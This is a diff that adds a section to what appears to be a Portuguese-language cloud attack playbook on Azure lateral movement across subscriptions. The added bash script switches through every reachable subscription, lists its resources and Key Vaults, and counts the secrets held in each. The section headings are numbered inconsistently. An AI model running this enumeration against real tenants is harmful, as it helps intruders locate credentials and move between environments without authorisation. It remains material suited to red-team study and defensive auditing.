@@ -342,6 +342,52 @@ az monitor diagnostic-settings create \
 
 ---
 
+
+## 3.6 LATERAL MOVEMENT
+
+## 5.3 AZURE CROSS-SUBSCRIPTION LATERAL MOVEMENT
+
+### 📋 EXPLORAÇÃO
+
+```bash
+#!/bin/bash
+# Script: azure-cross-subscription.sh
+
+echo "[*] Enumerando subscriptions acessíveis"
+
+# Listar subscriptions
+SUBSCRIPTIONS=$(az account list --query '[*].[id, name]' --output text)
+
+echo "[+] Subscriptions acessíveis:"
+echo "$SUBSCRIPTIONS" | while read sub_id sub_name; do
+  echo "    [$sub_id] $sub_name"
+done
+
+# Para cada subscription, explorar
+for sub_id in $(az account list --query '[*].id' --output text); do
+  echo "[*] Explorando subscription: $sub_id"
+  
+  # Mudar subscription
+  az account set --subscription $sub_id
+  
+  # Listar recursos
+  RESOURCES=$(az resource list --query '[*].[name, type]' --output text | head -5)
+  echo "[+] Recursos encontrados:"
+  echo "$RESOURCES"
+  
+  # Procurar Key Vaults
+  VAULTS=$(az keyvault list --query '[*].name' --output text)
+  if [ ! -z "$VAULTS" ]; then
+    echo "[!] Key Vaults encontrados:"
+    for vault in $VAULTS; do
+      SECRETS=$(az keyvault secret list --vault-name $vault --query '[*].name' --output text 2>/dev/null)
+      echo "    [$vault] Secrets: $(echo $SECRETS | wc -w)"
+    done
+  fi
+done
+```
+
+
 ## 🛠️ TOOLS NECESSÁRIAS
 
 ```bash
